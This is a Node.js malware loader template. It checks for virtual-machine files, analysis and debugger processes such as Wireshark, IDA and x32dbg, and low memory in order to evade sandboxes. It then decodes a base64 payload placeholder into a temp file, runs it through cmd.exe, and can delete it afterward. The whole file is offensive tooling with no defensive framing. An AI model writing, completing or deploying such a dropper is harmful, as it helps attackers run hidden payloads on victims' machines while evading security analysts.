const fs = require('fs');
const os = require('os');
const path = require('path');
const spawn = require('child_process').spawn;

const file_ending = "YOUR_FILE_ENDING_HERE";
let remove = false;
const antiVMEnabled = false;

const vm_files = [
    "C:\\windows\\system32\\vmGuestLib.dll",
    "C:\\windows\\system32\\vm3dgl.dll",
    "C:\\windows\\system32\\vboxhook.dll",
    "C:\\windows\\system32\\vboxmrxnp.dll",
    "C:\\windows\\system32\\vmsrvc.dll",
    "C:\\windows\\system32\\drivers\\vmsrvc.sys"
];

const blacklisted_processes = [
    'vmtoolsd.exe', 
    'vmwaretray.exe', 
    'vmwareuser.exe',
    'fakenet.exe', 
    'dumpcap.exe', 
    'httpdebuggerui.exe', 
    'wireshark.exe', 
    'fiddler.exe', 
    'vboxservice.exe', 
    'df5serv.exe', 
    'vboxtray.exe', 
    'vmwaretray.exe', 
    'ida64.exe', 
    'ollydbg.exe', 
    'pestudio.exe', 
    'vgauthservice.exe', 
    'vmacthlp.exe', 
    'x96dbg.exe', 
    'x32dbg.exe', 
    'prl_cc.exe', 
    'prl_tools.exe', 
    'xenservice.exe', 
    'qemu-ga.exe', 
    'joeboxcontrol.exe', 
    'ksdumperclient.exe', 
    'ksdumper.exe', 
    'joeboxserver.exe'
];

function deleteTempFile(tempDir) {
    try {
        fs.unlinkSync(tempDir);
        console.log('Temp file deleted successfully.');
    } catch (err) {
        console.error('Error deleting temp file:', err);
    }
}

function isVirtualized() {
    for (let file of vm_files) {
        if (fs.existsSync(file)) {
            return true;
        }
    }

    const processList = os.platform() === 'win32' ? require('windows-processes') : [];
    for (let process of blacklisted_processes) {
        if (processList.includes(process)) {
            return true;
        }
    }

    const totalMemoryGB = os.totalmem() / 1024 / 1024 / 1024;
    if (totalMemoryGB < 4) {
        return true;
    }

    return false;
}

function main() {
    if (antiVMEnabled && isVirtualized()) {
        console.log('Virtual machine detected. Terminating execution.');
        return;
    }

    const tempDir = path.join(os.tmpdir(), `main.${file_ending}`);
    const b64stuff = "BASE64ENCODEDSTUFFHERE";
    const decoded = Buffer.from(b64stuff, 'base64');

    fs.writeFile(tempDir, decoded, function (err) {
        if (err) {
            console.log("Error writing temp file:", err);
            return;
        }

        const cmdArgs = process.argv.slice(2);
        const allArgs = ["/C", "call", tempDir].concat(cmdArgs);

        const out = spawn("cmd.exe", allArgs, {
            stdio: 'inherit'
        });

        out.on('exit', function (code) {
            if (remove) {
                deleteTempFile(tempDir);
            }
        });
    });
}

main();
